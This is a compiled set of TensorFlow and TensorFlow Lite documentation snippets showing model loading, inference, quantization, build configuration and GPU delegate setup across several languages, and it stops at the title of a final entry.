DESCRIPTION: Demonstrates initializing the TensorFlow Lite ImageSearcher in Java. It shows how to configure options like GPU usage and L2 normalization, create the searcher instance from a file and options, and then perform a search operation on an input image.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_searcher.md#_snippet_1

LANGUAGE: Java
CODE:
```
// Initialization
ImageSearcherOptions options =
    ImageSearcherOptions.builder()
        .setBaseOptions(BaseOptions.builder().useGpu().build())
        .setSearcherOptions(
            SearcherOptions.builder().setL2Normalize(true).build())
        .build();
ImageSearcher imageSearcher =
    ImageSearcher.createFromFileAndOptions(context, modelFile, options);

// Run inference
List<NearestNeighbor> results = imageSearcher.search(image);
```

----------------------------------------

TITLE: Defining Dummy Representative Dataset (Python)
DESCRIPTION: This function generates 100 samples of random data shaped like a typical image input (batch size 1, 244x244 pixels, 3 channels). It is useful for quickly testing the full integer quantization flow when a real representative dataset is not immediately available. The data is yielded as a list of NumPy arrays, cast to float32.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_3

LANGUAGE: Python
CODE:
```
def representative_dataset():
    for _ in range(100):
      data = np.random.rand(1, 244, 244, 3)
      yield [data.astype(np.float32)]
```

----------------------------------------

TITLE: Generating Dataset from Data Loader - Python
DESCRIPTION: Creates a TensorFlow `Dataset` object from the data loaded by the data loader instance. It allows customization of batch size, shuffling behavior, training mode, and includes options for preprocessing and controlling the handling of the last batch.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/DataLoader.md#_snippet_3

LANGUAGE: python
CODE:
```
gen_dataset(
    batch_size=1,
    is_training=False,
    shuffle=False,
    input_pipeline_context=None,
    preprocess=None,
    drop_remainder=True,
    total_steps=None
)
```

----------------------------------------

TITLE: Initializing and Running Image Classification in Python
DESCRIPTION: Demonstrates how to initialize the ImageClassifier in Python. It shows importing modules, setting base and classification options, creating the classifier, loading an image using TensorImage, and running the classify method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_classifier.md#_snippet_6

LANGUAGE: Python
CODE:
```
# Imports
from tflite_support.task import vision
from tflite_support.task import core
from tflite_support.task import processor

# Initialization
base_options = core.BaseOptions(file_name=model_path)
classification_options = processor.ClassificationOptions(max_results=2)
options = vision.ImageClassifierOptions(base_options=base_options, classification_options=classification_options)
classifier = vision.ImageClassifier.create_from_options(options)

# Alternatively, you can create an image classifier in the following manner:
# classifier = vision.ImageClassifier.create_from_file(model_path)

# Run inference
image = vision.TensorImage.create_from_file(image_path)
classification_result = classifier.classify(image)
```

----------------------------------------

TITLE: Initialize and Run Image Embedding in C++
DESCRIPTION: This snippet demonstrates how to initialize the TFLite ImageEmbedder with options, create FrameBuffer inputs from raw image data, run inference on two images, and compute the cosine similarity between the resulting embeddings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_embedder.md#_snippet_0

LANGUAGE: C++
CODE:
```
// Initialization
ImageEmbedderOptions options:
options.mutable_model_file_with_metadata()->set_file_name(model_path);
options.set_l2_normalize(true);
std::unique_ptr<ImageEmbedder> image_embedder = ImageEmbedder::CreateFromOptions(options).value();

// Create input frame_buffer_1 and frame_buffer_2 from your inputs `image_data1`, `image_data2`, `image_dimension1` and `image_dimension2`.
// See more information here: tensorflow_lite_support/cc/task/vision/utils/frame_buffer_common_utils.h
std::unique_ptr<FrameBuffer> frame_buffer_1 = CreateFromRgbRawBuffer(
      image_data1, image_dimension1);
std::unique_ptr<FrameBuffer> frame_buffer_2 = CreateFromRgbRawBuffer(
      image_data2, image_dimension2);

// Run inference on two images.
const EmbeddingResult result_1 = image_embedder->Embed(*frame_buffer_1);
const EmbeddingResult result_2 = image_embedder->Embed(*frame_buffer_2);

// Compute cosine similarity.
double similarity = ImageEmbedder::CosineSimilarity(
    result_1.embeddings[0].feature_vector(),
    result_2.embeddings[0].feature_vector());
```

----------------------------------------

TITLE: Evaluating Model on Test Data - Python
DESCRIPTION: Evaluates the performance of the trained Keras model on the independent test dataset (`X_test`, `y_test`). It computes and returns the loss and accuracy metrics, providing a final measure of the model's generalization ability on data it has not seen during training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_19

LANGUAGE: python
CODE:
```
# Evaluate the model using the TEST dataset
loss, accuracy = model.evaluate(X_test, y_test)
```

----------------------------------------

TITLE: while Loop with tf.Tensor Condition - TensorFlow Python
DESCRIPTION: A Python `while` loop where the condition is a `tf.Tensor`. AutoGraph will automatically convert this loop into a `tf.while_loop` operation, allowing the iterative execution to be part of the TensorFlow graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_15

LANGUAGE: Python
CODE:
```
x = 0
while tf.random.uniform(()) > 0.5:
  x = x + 1
```

----------------------------------------

TITLE: Adding Metal delegate Pod - Ruby
DESCRIPTION: Modify your Podfile to include the TensorFlowLiteSwift pod with the 'Metal' subspec. This step is required to add the GPU delegate dependency to your iOS project using CocoaPods, as the delegate is excluded by default in recent versions (>= 2.3.0). Two alternative syntax options are provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_0

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteSwift/Metal', '~> 0.0.1-nightly',
```

LANGUAGE: Ruby
CODE:
```
pod 'TensorFlowLiteSwift', '~> 0.0.1-nightly', :subspecs => ['Metal']
```

----------------------------------------

TITLE: Running Distributed Strategy Step Function Python
DESCRIPTION: A simple TensorFlow function that demonstrates how to execute a distributed step function (like `step_fn` in the previous snippet) using the `strategy.run` method within a TensorFlow distributed strategy context. Requires a distributed strategy setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_6

LANGUAGE: Python
CODE:
```
@tf.function
def run_fn():
  return strategy.run(step_fn)
```

----------------------------------------

TITLE: Resizing Dynamic Input Tensor Python
DESCRIPTION: Shows the Python equivalent for handling dynamic input shapes in TFLite. It demonstrates loading the model, using 'interpreter.resize_tensor_input' with the tensor index and new shape (e.g., [3, 10]), and then allocating tensors. Requires TensorFlow and a loaded TFLite file path.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_21

LANGUAGE: python
CODE:
```
# Load the TFLite model in TFLite Interpreter
interpreter = tf.lite.Interpreter(model_path=TFLITE_FILE_PATH)
  
# Resize input shape for dynamic shape model and allocate tensor
interpreter.resize_tensor_input(interpreter.get_input_details()[0]['index'], [3, 10])
interpreter.allocate_tensors()
  
# Get input and output tensors.
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()
```

----------------------------------------

TITLE: Verifying TFLite Model Output
DESCRIPTION: Compares the output of the converted TFLite model with the original JAX model. It loads the TFLite model into an interpreter, performs inference on a sample input (`train_images[0:1]`), and uses `np.testing.assert_almost_equal` to assert that the TFLite output is numerically close to the JAX model's output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_10

LANGUAGE: Python
CODE:
```
serving_func = functools.partial(predict, params)
expected = serving_func(train_images[0:1])

# Run the model with TensorFlow Lite
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()
interpreter.set_tensor(input_details[0]["index"], train_images[0:1, :, :])
interpreter.invoke()
result = interpreter.get_tensor(output_details[0]["index"])

# Assert if the result of TFLite model is consistent with the JAX model.
np.testing.assert_almost_equal(expected, result, 1e-5)
```

----------------------------------------

TITLE: Defining Float16 Quantization Config - TensorFlow Lite Model Maker - Python
DESCRIPTION: Creates a `QuantizationConfig` object specifically for float16 post-training quantization. This configuration can then be applied when exporting a TensorFlow Lite model to reduce its size and improve performance on supported hardware.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_30

LANGUAGE: python
CODE:
```
config = QuantizationConfig.for_float16()
```

----------------------------------------

TITLE: Loading Data Detailed Process Python
DESCRIPTION: Loads image data from the specified image_path directory using DataLoader.from_folder. It assumes that image files within subfolders represent different classes, with the subfolder name being the class label.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
data = DataLoader.from_folder(image_path)
```

----------------------------------------

TITLE: Initializing TFLite NLClassifier from Options in Python
DESCRIPTION: Initializes the TensorFlow Lite NLClassifier using the defined configuration parameters. It sets up the base options (file name, EdgeTPU usage, thread count) and then creates the classifier instance from these options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_12

LANGUAGE: python
CODE:
```
# Initialize the text classification model.
base_options = core.BaseOptions(file_name=_MODEL, use_coral=_ENABLE_EDGETPU, num_threads=_NUM_THREADS)
options = text.NLClassifierOptions(base_options)

# Create NLClassifier from options.
classifier = text.NLClassifier.create_from_options(options)
```

----------------------------------------

TITLE: Training Text Classification Model with Average Word Vec Spec in Python
DESCRIPTION: Trains a text classification model using the loaded training data and the 'average_word_vec' model specification for a specified number of epochs (10). The function returns the trained model object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
model = text_classifier.create(train_data, model_spec=spec, epochs=10)
```

----------------------------------------

TITLE: Loading Audio Data and Running TFLite Classification (Kotlin)
DESCRIPTION: Reads the latest audio data from the AudioRecord buffer and loads it into the TensorAudio object, preparing it in the format expected by the model. It then invokes the classify method of the AudioClassifier to perform the inference on this prepared audio data, producing raw classification results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_10

LANGUAGE: kotlin
CODE:
```
private fun classifyAudio() {
  tensorAudio.load(recorder)
  val output = classifier.classify(tensorAudio)
  ...
}
```

----------------------------------------

TITLE: Customizing MobileBERT Spec Sequence Length - TensorFlow Lite Model Maker - Python
DESCRIPTION: Retrieves the MobileBERT classifier model specification and modifies the `seq_len` parameter to change the input sequence length that the model can process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_22

LANGUAGE: python
CODE:
```
new_model_spec = model_spec.get('mobilebert_classifier')
new_model_spec.seq_len = 256
```

----------------------------------------

TITLE: Sampling Next Character Indices Python
DESCRIPTION: This code samples the next character index for each timestep of the first example's predictions using `tf.random.categorical` based on the output logits. This is preferred over argmax to avoid loops.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_25

LANGUAGE: python
CODE:
```
sampled_indices = tf.random.categorical(example_batch_predictions[0], num_samples=1)
sampled_indices = tf.squeeze(sampled_indices,axis=-1).numpy()
```

----------------------------------------

TITLE: Example CMakeLists for Using TensorFlow Lite Library
DESCRIPTION: Provides a sample `CMakeLists.txt` file demonstrating how to incorporate the TensorFlow Lite library, built previously with CMake, into another CMake-based project. It uses `add_subdirectory` to include the TFLite build output and `target_link_libraries` to link the library to an executable target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_20

LANGUAGE: cmake
CODE:
```
cmake_minimum_required(VERSION 3.16)
project(minimal C CXX)

set(TENSORFLOW_SOURCE_DIR "" CACHE PATH
  "Directory that contains the TensorFlow project" )
if(NOT TENSORFLOW_SOURCE_DIR)
  get_filename_component(TENSORFLOW_SOURCE_DIR
    "${CMAKE_CURRENT_LIST_DIR}/../../../../" ABSOLUTE)
endif()

add_subdirectory(
  "${TENSORFLOW_SOURCE_DIR}/tensorflow/lite"
  "${CMAKE_CURRENT_BINARY_DIR}/tensorflow-lite" EXCLUDE_FROM_ALL)

add_executable(minimal minimal.cc)
target_link_libraries(minimal tensorflow-lite)
```

----------------------------------------

TITLE: Preprocessing Image and Creating TensorImage (Kotlin)
DESCRIPTION: Creates an `ImageProcessor` to apply transformations like rotation using `Rot90Op` based on the input image's rotation. It then processes the input `image` `Bitmap` using this processor and converts the result into a `TensorImage`, which is the required input format for TensorFlow Lite models. Requires the `tensorflow-lite-support` dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_11

LANGUAGE: Kotlin
CODE:
```
val imageProcessor = ImageProcessor.Builder().add(Rot90Op(-imageRotation / 90)).build()
// Preprocess the image and convert it into a TensorImage for detection.
val tensorImage = imageProcessor.process(TensorImage.fromBitmap(image))
```

----------------------------------------

TITLE: Importing TensorFlowLite Umbrella Header Objective-C
DESCRIPTION: Imports the main umbrella header file for the TensorFlow Lite Objective-C library when module support is not enabled in your Xcode project settings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_3

LANGUAGE: objectivec
CODE:
```
#import "TFLTensorFlowLite.h"
```

----------------------------------------

TITLE: Adding Generated Wrapper Module Dependency (Gradle)
DESCRIPTION: Adds a module dependency in an Android app's build.gradle file to include the previously imported or generated wrapper module (e.g., `classify_wrapper`) for the TensorFlow Lite model, making the generated classes available to the app.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_7

LANGUAGE: Gradle
CODE:
```
implementation project(":classify_wrapper")
```

----------------------------------------

TITLE: Compiling and Training Keras Model - Python
DESCRIPTION: Compiles the Keras pose classification model using the Adam optimizer and categorical crossentropy loss. It then trains the model on the prepared training data (`X_train`, `y_train`), validates performance on `X_val`, `y_val`, and includes callbacks to save the best model weights based on validation accuracy and stop early if validation accuracy plateaus.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
model.compile(
    optimizer='adam',
    loss='categorical_crossentropy',
    metrics=['accuracy']
)

# Add a checkpoint callback to store the checkpoint that has the highest
# validation accuracy.
checkpoint_path = "weights.best.hdf5"
checkpoint = keras.callbacks.ModelCheckpoint(checkpoint_path,
                             monitor='val_accuracy',
                             verbose=1,
                             save_best_only=True,
                             mode='max')
earlystopping = keras.callbacks.EarlyStopping(monitor='val_accuracy', 
                                              patience=20)

# Start training
history = model.fit(X_train, y_train,
                    epochs=200,
                    batch_size=16,
                    validation_data=(X_val, y_val),
                    callbacks=[checkpoint, earlystopping])
```

----------------------------------------

TITLE: Running Keras JAX Model Inference and Decoding Python
DESCRIPTION: This snippet preprocesses the input image data using the ResNet50-specific function, runs the preprocessed data through the Keras model (`jax_model`). It then decodes the model's output probabilities to get the predicted class name and confidence score using `decode_predictions` and prints the result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
input_data = keras.applications.resnet50.preprocess_input(input_image)
jax_model_output = jax_model(input_data)

decoded_preds = keras.applications.resnet.decode_predictions(jax_model_output, top=1)[
    0
][0]
print("Predicted class:", decoded_preds[1])
```

----------------------------------------

TITLE: Creating EfficientNet-Lite2 Model Spec in Python
DESCRIPTION: Initializes an `EfficientNetLite2Spec` object for use with TensorFlow Lite Model Maker. This class defines the configuration for training or fine-tuning an EfficientNet-Lite2 model for image classification. It requires the `tflite_model_maker` library and accepts parameters to specify the URI of the pretrained model, compatible TensorFlow versions, the expected input image shape, and an optional name.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/EfficientNetLite2Spec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.image_classifier.EfficientNetLite2Spec(
    *,
    uri='https://tfhub.dev/tensorflow/efficientnet/lite2/feature-vector/2',
    compat_tf_versions=[1, 2],
    input_image_shape=[260, 260],
    name='efficientnet_lite2'
)
```

----------------------------------------

TITLE: Exporting Model to TFLite with YamNetSpec [Python]
DESCRIPTION: Converts the trained Keras model to the TensorFlow Lite format and saves it to the specified filepath. This method overrides the default export to include spectrogram extraction within the model. It supports including metadata, exporting metadata to a JSON file, providing label mapping, and applying post-training quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/YamNetSpec.md#_snippet_3

LANGUAGE: python
CODE:
```
export_tflite(
    model,
    tflite_filepath,
    with_metadata=True,
    export_metadata_json_file=True,
    index_to_label=None,
    quantization_config=None
)
```

----------------------------------------

TITLE: Running TFLite Inference with C API
DESCRIPTION: Demonstrates the steps to load a TFLite model and perform inference using the TensorFlow Lite C API. This involves creating the model and interpreter objects, allocating tensors, copying input data, invoking the model, extracting output data, and cleaning up resources.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_13

LANGUAGE: C
CODE:
```
TfLiteModel* model = TfLiteModelCreateFromFile([modelPath UTF8String]);
TfLiteInterpreterOptions* options = TfLiteInterpreterOptionsCreate();

// Create the interpreter.
TfLiteInterpreter* interpreter = TfLiteInterpreterCreate(model, options);

// Allocate tensors and populate the input tensor data.
TfLiteInterpreterAllocateTensors(interpreter);
TfLiteTensor* input_tensor =
    TfLiteInterpreterGetInputTensor(interpreter, 0);
TfLiteTensorCopyFromBuffer(input_tensor, input.data(),
                           input.size() * sizeof(float));

// Execute inference.
TfLiteInterpreterInvoke(interpreter);

// Extract the output tensor data.
const TfLiteTensor* output_tensor =
    TfLiteInterpreterGetOutputTensor(interpreter, 0);
TfLiteTensorCopyToBuffer(output_tensor, output.data(),
                         output.size() * sizeof(float));

// Dispose of the model and interpreter objects.
TfLiteInterpreterDelete(interpreter);
TfLiteInterpreterOptionsDelete(options);
TfLiteModelDelete(model);
```

----------------------------------------

TITLE: Initializing and Running BertNLClassifier in Python
DESCRIPTION: This Python code demonstrates how to import the `BertNLClassifier` class from `tflite_support.task.text`. It shows how to create a classifier instance directly from a model file path and then perform classification on input text using the `classify` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_nl_classifier.md#_snippet_6

LANGUAGE: python
CODE:
```
# Imports
from tflite_support.task import text

# Initialization
classifier = text.BertNLClassifier.create_from_file(model_path)

# Run inference
text_classification_result = classifier.classify(text)
```

----------------------------------------

TITLE: Initialize TFLite Runtime from Play Services
DESCRIPTION: Initializes the TensorFlow Lite runtime asynchronously by calling `TfLiteNative.initialize` from Java or Kotlin code. This returns a `Task` that must complete successfully before any TFLite Native API functions can be safely invoked.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_3

LANGUAGE: Java
CODE:
```
Task tfLiteInitializeTask = TfLiteNative.initialize(context);
```

LANGUAGE: Kotlin
CODE:
```
val tfLiteInitializeTask: Task<Void> = TfLiteNative.initialize(context)
```

----------------------------------------

TITLE: Executing TFLite Model Signatures - Java
DESCRIPTION: Demonstrates how to load a TensorFlow Lite model and run specific signatures ('encode', 'decode') using the Java Interpreter's runSignature method, passing inputs and receiving outputs via Maps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_5

LANGUAGE: Java
CODE:
```
try (Interpreter interpreter = new Interpreter(file_of_tensorflowlite_model)) {
  // Run encoding signature.
  Map<String, Object> inputs = new HashMap<>();
  inputs.put("x", input);
  Map<String, Object> outputs = new HashMap<>();
  outputs.put("encoded_result", encoded_result);
  interpreter.runSignature(inputs, outputs, "encode");

  // Run decoding signature.
  Map<String, Object> inputs = new HashMap<>();
  inputs.put("x", encoded_result);
  Map<String, Object> outputs = new HashMap<>();
  outputs.put("decoded_result", decoded_result);
  interpreter.runSignature(inputs, outputs, "decode");
}
```

----------------------------------------

TITLE: Use Local Maven TensorFlow Lite AAR in Gradle Project
DESCRIPTION: Modify your Android app's build.gradle file to include the local Maven repository and declare the TensorFlow Lite dependency using its group, artifact ID, and version. This allows the project to resolve the dependency from your local Maven cache where the AAR was installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/lite_build.md#_snippet_10

LANGUAGE: groovy
CODE:
```
allprojects {
    repositories {
        mavenCentral()
        maven {  // Only for snapshot artifacts
            name 'ossrh-snapshot'
            url 'https://oss.sonatype.org/content/repositories/snapshots'
        }
        mavenLocal()
    }
}

dependencies {
    implementation 'org.tensorflow:tensorflow-lite:0.1.100'
}
```

----------------------------------------

TITLE: Importing TensorFlowLite Module Objective-C
DESCRIPTION: Imports the TensorFlow Lite Objective-C library as a module, typically used when CLANG_ENABLE_MODULES is YES and use_frameworks! is included in the Podfile.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_4

LANGUAGE: objectivec
CODE:
```
@import TFLTensorFlowLite;
```

----------------------------------------

TITLE: Handling BertQuestionAnswerer Results in Android UI (Kotlin)
DESCRIPTION: This Kotlin function implements the `onResults` method of the AnswererListener. It processes the list of answers received from the model, highlights the text of the first answer in the passage, and displays the measured inference time in a TextView.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_11

LANGUAGE: kotlin
CODE:
```
override fun onResults(results: List<QaAnswer>?, inferenceTime: Long) {
    results?.first()?.let {
        highlightAnswer(it.text)
    }

    fragmentQaBinding.tvInferenceTime.text = String.format(
        requireActivity().getString(R.string.bottom_view_inference_time),
        inferenceTime
    )
}
```

----------------------------------------

TITLE: Initializing TFLite AudioClassifier and Input Objects (Kotlin)
DESCRIPTION: Initializes the TensorFlow Lite AudioClassifier from a model file with specified options. It then creates the necessary TensorAudio object for holding processed audio data and an AudioRecord object for capturing raw audio from the microphone, both configured based on the classifier's requirements. This sets up the core components for audio input and classification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_7

LANGUAGE: kotlin
CODE:
```
fun initClassifier() {
...
  try {
    classifier = AudioClassifier.createFromFileAndOptions(context, currentModel, options)
    // create audio input objects
    tensorAudio = classifier.createInputTensorAudio()
    recorder = classifier.createAudioRecord()
  }
}
```

----------------------------------------

TITLE: Checking GPU Availability and Initializing TFLite Play Services Kotlin
DESCRIPTION: This Kotlin snippet mirrors the Java example, showing how to check for GPU delegate availability via TensorFlow Lite in Google Play Services (`TfLiteGpu.isGpuDelegateAvailable`). It uses the result to configure `TfLiteInitializationOptions` and initialize the TensorFlow Lite native runtime (`TfLiteNative.initialize`), enabling GPU support only if the check indicates availability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_3

LANGUAGE: kotlin
CODE:
```
val tfLiteHandleTask = TfLiteGpu.isGpuDelegateAvailable(this)
    .onSuccessTask { gpuAvailable ->
        val options = TfLiteInitializationOptions.Builder()
            .setEnableGpuDelegateSupport(gpuAvailable)
            .build()
        TfLiteNative.initialize(this, options)
    }
```

----------------------------------------

TITLE: Compiling TensorFlow Training Function with XLA Python
DESCRIPTION: Demonstrates how to use the `@tf.function(jit_compile=True)` decorator to explicitly compile an entire TensorFlow function, specifically an MNIST training loop, with XLA for potential performance gains. This requires TensorFlow and relevant Keras/layer/optimizer setup.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/index.md#_snippet_1

LANGUAGE: Python
CODE:
```
@tf.function(jit_compile=True)
def train_mnist(images, labels):
    images, labels = cast(images, labels)

    with tf.GradientTape() as tape:
      predicted_labels = layer(images)
      loss = tf.reduce_mean(tf.nn.sparse_softmax_cross_entropy_with_logits(
          logits=predicted_labels, labels=labels
      ))
    layer_variables = layer.trainable_variables
    grads = tape.gradient(loss, layer_variables)
    optimizer.apply_gradients(zip(grads, layer_variables))
```

----------------------------------------

TITLE: Configuring Batching and Shuffling - Python
DESCRIPTION: This snippet sets the batch size and buffer size for shuffling the dataset. The buffer size is used by `tf.data` to shuffle elements efficiently without loading the entire dataset into memory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
# Batch size
BATCH_SIZE = 64

# Buffer size to shuffle the dataset
# (TF data is designed to work with possibly infinite sequences,
# so it doesn't attempt to shuffle the entire sequence in memory. Instead,
# it maintains a buffer in which it shuffles elements).
BUFFER_SIZE = 10000
```

----------------------------------------

TITLE: Downloading Images and TensorFlow Lite Models (Python)
DESCRIPTION: Downloads a sample content image, a sample style image, and the pre-trained TensorFlow Lite models (style prediction and style transform) from specified URLs using `tf.keras.utils.get_file`. These files are saved locally and are required inputs for the style transfer process. Requires TensorFlow and an active internet connection.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/style_transfer/overview.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
content_path = tf.keras.utils.get_file('belfry.jpg','https://storage.googleapis.com/khanhlvg-public.appspot.com/arbitrary-style-transfer/belfry-2611573_1280.jpg')
style_path = tf.keras.utils.get_file('style23.jpg','https://storage.googleapis.com/khanhlvg-public.appspot.com/arbitrary-style-transfer/style23.jpg')

style_predict_path = tf.keras.utils.get_file('style_predict.tflite', 'https://tfhub.dev/google/lite-model/magenta/arbitrary-image-stylization-v1-256/int8/prediction/1?lite-format=tflite')
style_transform_path = tf.keras.utils.get_file('style_transform.tflite', 'https://tfhub.dev/google/lite-model/magenta/arbitrary-image-stylization-v1-256/int8/transfer/1?lite-format=tflite')
```

----------------------------------------

TITLE: Exporting TFLite with Float16 Quantization - TensorFlow Lite Model Maker - Python
DESCRIPTION: Exports the trained model to a TensorFlow Lite file, applying the specified float16 post-training quantization configuration. This results in a smaller model file (`model_fp16.tflite` in this case) optimized for performance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_31

LANGUAGE: python
CODE:
```
model.export(export_dir='.', tflite_filename='model_fp16.tflite', quantization_config=config)
```

----------------------------------------

TITLE: Creating AudioClassifier from Options Python
DESCRIPTION: Creates an AudioClassifier object using a pre-configured AudioClassifierOptions object. This class method provides flexibility by allowing users to specify detailed configuration options before creating the classifier instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifier.md#_snippet_4

LANGUAGE: Python
CODE:
```
@classmethod
create_from_options(
    options: <a href="../../../tflite_support/task/audio/AudioClassifierOptions"><code>tflite_support.task.audio.AudioClassifierOptions</code></a>
) -> 'AudioClassifier'
```

----------------------------------------

TITLE: Create Standalone TFLite Interpreter with GPU (Java)
DESCRIPTION: Initializes a `CompatibilityList` to check for GPU support on the device. If GPU is supported, it creates a `GpuDelegate` with the best available options and adds it to the `Interpreter.Options`; otherwise, it sets the number of threads. Finally, it initializes a standalone `Interpreter` with these options and includes placeholders for running inference. Requires standalone TFLite dependencies and a loaded `model`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_7

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.Interpreter;
      import org.tensorflow.lite.gpu.CompatibilityList;
      import org.tensorflow.lite.gpu.GpuDelegate;

      // Initialize interpreter with GPU delegate
      Interpreter.Options options = new Interpreter.Options();
      CompatibilityList compatList = CompatibilityList();

      if(compatList.isDelegateSupportedOnThisDevice()){
          // if the device has a supported GPU, add the GPU delegate
          GpuDelegate.Options delegateOptions = compatList.getBestOptionsForThisDevice();
          GpuDelegate gpuDelegate = new GpuDelegate(delegateOptions);
          options.addDelegate(gpuDelegate);
      } else {
          // if the GPU is not supported, run on 4 threads
          options.setNumThreads(4);
      }

      Interpreter interpreter = new Interpreter(model, options);

      // Run inference
      writeToInput(input);
      interpreter.run(input, output);
      readFromOutput(output);
```

----------------------------------------

TITLE: Converting Keras H5 Model using TFLite Convert CLI
DESCRIPTION: Provides the command-line instruction using tflite_convert to convert a TensorFlow Keras model saved in the H5 format to a TensorFlow Lite model file. It requires specifying the path to the Keras H5 input file and the desired TFLite output file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/convert_models.md#_snippet_5

LANGUAGE: sh
CODE:
```
tflite_convert \
  --keras_model_file=/tmp/mobilenet_keras_model.h5 \
  --output_file=/tmp/mobilenet.tflite
```

----------------------------------------

TITLE: Initializing Task API (TfLiteVision) with GPU Support (Kotlin)
DESCRIPTION: Initialize the TFLite Task API, specifically `TfLiteVision` in this example, enabling GPU delegate support during the initialization process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_19

LANGUAGE: Kotlin
CODE:
```
TfLiteVision.initialize(context, TfLiteInitializationOptions.builder().setEnableGpuDelegateSupport(true).build())
```

----------------------------------------

TITLE: Initializing and Running Image Segmenter in Java
